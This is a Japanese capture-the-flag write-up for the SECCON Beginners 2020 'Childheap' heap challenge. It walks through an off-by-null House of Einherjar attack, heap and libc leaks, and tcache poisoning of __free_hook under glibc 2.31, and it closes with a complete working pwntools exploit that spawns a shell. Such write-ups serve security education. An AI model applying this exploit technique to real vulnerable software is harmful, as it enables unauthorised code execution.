---
tags: pwn
---

# SECCON Beginners CTF 2020 - Childheap (+α)

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Constraints

本来この問題はglibc 2.29で出題された問題ですが大して変わらないと思い、ちょうど環境を構築していたUbuntu 20.04(glibc 2.31)で解きました(WSLにUbuntu 19.04が無いのが悪い)。
結果としてまず2.29要素で大苦戦したのは想定内(余裕とかではなく多分苦労するのだろうという)でしたが、2.31要素でも苦戦したのでその様子を書いておきます。

## Writeup

### Outline

2.29(今回は2.31で挑戦), ポインタ1つ, 0x180までの可変malloc, off-by-null有り, ポインタは破棄されないのでUAF(read)も出来る。
off-by-nullでチャンクサイズが0x100のチャンクは作ることが出来るのでまずはそいつらをfreeしてUAF(read)でheapのアドレスをリークする。
そのあとサイズ0x100のtcacheを埋めてしまい、House of Einherjarで結合したチャンクをUnsorted Binへ送る。
上手く切り出してlibc leakし、あとはoverlapしているチャンク群を上手く使いながらtcache poisoningで`__free_hook`を書き換える
但し、2.31ではtcacheのカウンタが0の場合にtcacheからエントリーを取ることが出来ないという強化パッチが入ったのでそれを回避する必要がある(ここがかなり雑なのでそのうちExploitを書き直したい)

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

- 保持可能ポインタ: 1
- malloc出来るサイズ: 可変(< 0x180)
- コマンド: 
    - alloc: create+edit、edit時にoff-by-one
    - delete: y/nで確認画面が走る。この際中身が表示されるのでshowの機能もある(showだけしたいならnを選べば良い)
    - wipe: ポインタをクリアする
    - exit: さようなら
- コマンド実行回数制限: 無し
- その他特記事項: 特に無し

### heap leak

libc 2.27までのoff-by-nullは超簡単でだいたい[(study) - off-by-one error](/@Xornet/Bk1OIIq6U)で書いているようにすればチャンクのoverlapを利用して解ける。
しかし、今回はlibc 2.29(以降)なのでそううまく行かない。具体的には`prev_size`が前のチャンクのサイズと一致しているかのチェックが走る。
2.27までは3つのチャンクを巻き込む形でのBackward Consolidationを利用していたが、これはprev_sizeの改竄を伴っており、このチェックが無いために通用した。しかし2.29はそうではないのでまた別の手法を使う必要がある。
これにはHeap leakが必要なのでまずはHeap leakをする。
off-by-nullで真下のチャンクのサイズを0x100に出来るので次のような手段を使えば0x100のチャンクを別のサイズから作ることが出来る。

1. 0x100以外のサイズを適当に用意しallocする、このサイズを`s_0`とおく
2. deleteする
3. `s_0`と異なり、0x100以上のサイズ`s_1`を用意してallocする
4. deleteする
5. この時のメモリ配置は次の通り

```
A(freed): s_0
B(freed): s_1
```
6. `s_0`のチャンクをallocする。Aが確保されてeditも発生するのでoff-by-nullでBのサイズは`0x100`になる
7. `s_1`のチャンクをallocする。サイズヘッダが変わってしまったがtcacheには繋がっているので3と同じように要求すれば良い
8. deleteする。チャンクヘッダが変わってしまったので今度は0x100のtcacheに繋がれる

この問題はポインタが1つなので同じサイズのtcacheを埋めることが簡単には出来ない。そこでoff-by-nullを利用して0x100だけはtcacheを埋められるようにする。
ひとまず2つ繋げたところでUAF(read)でアドレスを読み、heapのアドレスをleakする。

以後、Unsorted Binへチャンクを送りたいので同じ手順でサイズ0x100のチャンクを繰り返し送り、tcacheのカウントを7にしておく

### House of Einherjar

House of Einherjarはoff-by-nullで真下のチャンクのPREV_INUSEを潰し、真下のチャンクをfreeするとBackward Consolidationが走るのでポインタが生きているチャンクをoverlapさせながらUnsorted Binへ送ることが出来る手法である。
但しUnsorted Binに送る際の条件は結構厳しく次のような手順を経る

```
A(size: s_a): overflown(1 byte null)
B(size: s_b): PREV_INUSE=0
```

このようなメモリ配置を考え、Bをfreeしたとする。PREV_INUSEフラグが潰れているので真上のチャンクとの結合を図る。
まずここでBのprev_sizeから真上のチャンクがどこであるかを特定する。本問題ではポインタが生きている(tcacheの先頭にあって簡単に召喚できる)チャンクとoverlapさせるのだがひとまず簡単のためにAとする。
したがって`prev_size == s_a`でなくてはならない、これがまず1つ目の制約である。
続いて結合対象チャンクがAであると判明したので本当にAがfreeされているかを調べる。
これはfd, bkがbin内のリンクリストとして正当であるかを判断する(らしい、誤っていたら修正します)。
ここで先程判明したheapのアドレスからAのアドレスが分かる。よってfd, bkとしてAへのedit時にfd, bkにAのアドレスを入れておくとリンクリストはA自体だけから成り、Aのfdで示された先のbkがAであるかとAのbkで示された先のfdがAであるかを調べられる。
どちらにもAのアドレスを入れたのでこのチェックはすり抜けることが出来る
ついでにtopとのconsolidationを防ぐために適当に下に使用中のチャンクを配置しておく。これでA+BとなったチャンクがUnsorted Binへ送られることになる。

実際は次のように偽装したチャンクな配置でUnsorted Binへ送っている、最終的にA'+BがUnsorted Binへ送られ、Aがoverlapしている
なお、使いやすくするためにA0, A, Bのサイズは異なるようにしておく。

```
A0: 通常のallocで取得、下のA'を偽装するようにサイズヘッダ, fd, bkを整える、deleteしてtcacheに待機させる
A': 偽装チャンク、A0のeditで作る
A : 通常のallocで取得、off-by-nullでBのPREV_INUSEを潰してdeleteしてtcacheに待機させる
B : 通常のallocで取得、Aのoff-by-nullとeditでA'が真上と錯覚して結合する
```

### libc leak

Unsorted Binに送られたので適当にmallocすると切り出しが行われ、fd, bkが下に降りてくる。ここでAはtcacheで待機しているのでここを確保してshowするとlibcのアドレスが開示される。
但し、alloc時に書き込んだ部分の末尾にヌルバイトを付与してしまう都合上、fd, bkをそのまま読むことは叶わない。
show部分のソースを良く読むとサイズとして0を要求した際に何も書き込みが行われなくて無事に読めるのでこれを利用する。なお、このせいでAのサイズが最小の0x20であるという制約が発生する。

### いつもの(libc 2.29編)

Unsorted Binからの切り出しを行った結果次のようなメモリ配置になっている

```
A0: tcacheで待機、Aと隣接しているのでA'を内包
A': Aにfd, bkを下ろすために切り出されその際にdeleteされる、A0とoverlapしている
A : fd, bkを読むのに使用、もういらん(Unsorted Binの先頭はここ)
```

A'はA0とoverlapしている上にtcacheにいるのでまずはA0に対応するサイズのmallocを発動させてA0を確保しeditでA'のnextメンバを`__free_hook`のアドレスに書き換える
そして`A'`のサイズに対応するmallocを2回発動させると2回目で`__free_hook`を指すポインタが手に入るのでeditで値を書き込んであとは`free(p)`時に`"/bin/sh"`が呼ばれて終わりになる

のだが、2.31ではそうもいかない

### いつもの(libc 2.31, ゼロカウンタ回避編)

`A'`のサイズのカウンタがどうなっているか考えると`A'`がfd, bkを下ろすために切り出されてdeleteされた際に1増える。その後2回mallocが走るが、1回で1減って0になる。libc 2.29以前なら-1にすることも出来たのだがlibc 2.31はそうも出来ない、というわけで既に7もカウントが溜まっているサイズ0x100のエントリーを利用する。
tcacheはLIFOなのでもし`A'`をサイズ0x100のエントリーとしてfreeすることが出来ればサイズ`0x100`のtcacheの先頭には`A'`が来る。
もちろん`A0`を利用した上書きはまだ可能なのでここでサイズ0x100のtcacheに対してtcache poisoningを行い、`__free_hook`を書き換える事ができる。
というわけでまずサイズ0x100のtcacheのカウンタを下げて新しいエントリーが入るようにする。その状態で先程の2.29の上書きと同じ要領で"サイズ"を上書きする、もちろん0x101にする。
再び`A0`をfreeしてtcacheで待機させ、`A'`を確保する。サイズヘッダは変更されているが、元のサイズに対応するentriesに繋がっているので変更前のサイズに対応するmallocで取得できる。これをdeleteすると今度こそサイズ0x100としてfreeされてtcacheの先頭に繋がる。
後は2.29と同じ手順で`__free_hook`に自由なアドレスを入れることが出来るので`system`を仕込んで`system("/bin/sh")`を発動させるようにチャンクをfreeする。

クリア寸前にこれを食らってマジでショックを受けたのでちょっとした感想を置いておきます
`__free_hook`手前で手段を削がれたので二度とやりたくないです、とは思ったものの事前にサイズを調整してカウンタを水増しさせておくといったちょっとした対策で2.29と大して変わらない難易度に落とせるので慣れてしまえば問題はないかもしれません
ただ、今回は最後の最後に挫かれたのが本当に辛かったです。デバッガとにらめっこしてようやく辿り着いたと思ったらこれは精神に良くないです。

### 補遺

`A`のfd, bkを読んでlibc leakした地点で既にUnsorted Binは壊れているので以降はtcacheに入っているサイズで色々とやりくりする必要がある。
既にtcacheに入っているサイズで十分だが、面倒な事を考えたくないなら`A`でfd, bkを読んだところで`A`をfreeし、再確保してからfd, bkに`&main_arena->top`を入れておけば良い。

## Code

```python
from pwn import p64, u64, ELF, process


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(str(sel))


def alloc(s, size, data=b"/bin/sh"):
    select(s, 1)
    s.recvuntil(b"Size: ")
    s.sendline(str(size))
    s.recvuntil(b"Content: ")
    s.send(data)


def delete(s):
    select(s, 2)
    s.recvuntil(b"[y/n] ")
    s.sendline(b"y")


def wipe(s):
    select(s, 3)


def show(s):
    select(s, 2)
    s.recvuntil(b"Content: '")
    ret = s.recvuntil(b"'")[:-1]
    s.recvuntil(b"[y/n] ")
    s.sendline(b"n")

    return ret


# make chunk whose size is 0x100
def obn(s, size):
    alloc(s, 0x18)
    delete(s)
    wipe(s)
    alloc(s, size)
    delete(s)
    wipe(s)
    # off-by-null
    alloc(s, 0x18, b"a" * 0x18)
    wipe(s)
    alloc(s, size)


if __name__ == "__main__":
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - 2.29 (だが2.31で解いてる)
        - 可変サイズmalloc (<= 0x180)
        - ポインタ1つ(wipeしなければ生きている)
        - off-by-null(但しサイズ最大まで書き込まなくてはならない)
    """
    s = process("./childheap")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # heap leak
    alloc(s, 0xf8)
    delete(s)
    wipe(s)

    obn(s, 0x108)
    delete(s)
    leak = u64(show(s).ljust(8, b"\x00")) # perthreadを除く中で一番上にある
    print(hex(leak))
    wipe(s)

    # fill tcache
    for _ in range(5):
        obn(s, 0x108)
        delete(s)
        wipe(s)

    # avoid abort
    diff = 0x7fffeb715ac0 - 0x7fffeb7152a0 + 0x10  # I found offset by debug
    payload = p64(0) * 3 + p64(0x51) + p64(leak + diff) * 2
    alloc(s, 0x48, payload)
    delete(s)
    wipe(s)
    alloc(s, 0x18)
    delete(s)
    wipe(s)
    alloc(s, 0x108)
    delete(s)
    wipe(s)
    alloc(s, 0x28)
    wipe(s)
    alloc(s, 0x28)
    wipe(s)
    # off-by-null
    alloc(s, 0x18, b"a" * 0x10 + p64(0x50))
    delete(s)
    wipe(s)
    alloc(s, 0x108, b"a" * 0xf8 + p64(0x41))
    delete(s)
    wipe(s)

    #libc leak
    alloc(s, 0x28)
    delete(s)
    wipe(s)
    alloc(s, 0x0, b"")
    offset = 0x7f6e1475bbe0 - 0x7f6e14570000
    arena_addr = u64(show(s).ljust(8, b"\x00"))
    libc_addr = arena_addr - offset
    system_libc = libc.symbols["system"]
    free_hook_libc = libc.symbols["__free_hook"]
    print(hex(libc_addr))
    wipe(s)

    # make space for tcache: 0x100
    alloc(s, 0xf8)
    wipe(s)

    # overwrite free hook
    alloc(s, 0x48, p64(0) * 3 + p64(0x101))  # overwrite size (0x31 -> 0x101)
    delete(s)
    wipe(s)
    alloc(s, 0x28)
    delete(s)
    wipe(s)
    alloc(s, 0x48, p64(0) * 3 + p64(0x101) + p64(libc_addr + free_hook_libc))
    delete(s)
    wipe(s)
    alloc(s, 0xf8)
    wipe(s)
    # _ = input()
    alloc(s, 0xf8, p64(libc_addr + system_libc))
    wipe(s)

    alloc(s, 0x48)
    delete(s)

    s.interactive()
```

## Flag

いつものローカルシェル奪取

## 反省点

* 最後のシェル起動用のdeleteを除くと、deleteの後にはwipeが来るのでまとめたほうが良かった
* 0x100 - 0x8 = 0x98を8億回ぐらいやった、早く指を16本にしたい

## 感想

Double Freeが死んでもHeap OverflowやUAFでまだまだ使えると思っていたtcache poisoningがまさかのカウンタが負にならないという罠で死にそうになりました。結構デカ目の強化なので2.29の問題は二度と2.31で解きたく無いです。
そういうこともあり、次からは2.29の環境を用意しておきます。

前回と今回(は殆ど意図せず)の難易度上昇チャレンジのせいで1問にかける時間が長くなり、このコーナーの頻度も落ちる予感がしますがぼちぼちoff-by-oneは卒業ということで次の課題(多分FSOP)に取り組んでいきたいと思います。

ところで昨年の[SECCON Beginners CTF 2019 - Babyheap](/yYXGki35TMemC0Jxi9xUHA)から流石に強化されすぎじゃないですか?同時出題のflipも相当難しかったようですが...

## 参考文献, 作問者Writeup等

* <https://shift-crops.hatenablog.com/entry/2020/05/24/211147>: 作問者Writeup
* <https://www.slideshare.net/codeblue_jp/cb16-matsukuma-ja-68459648>: House of Einherjarの初出スライド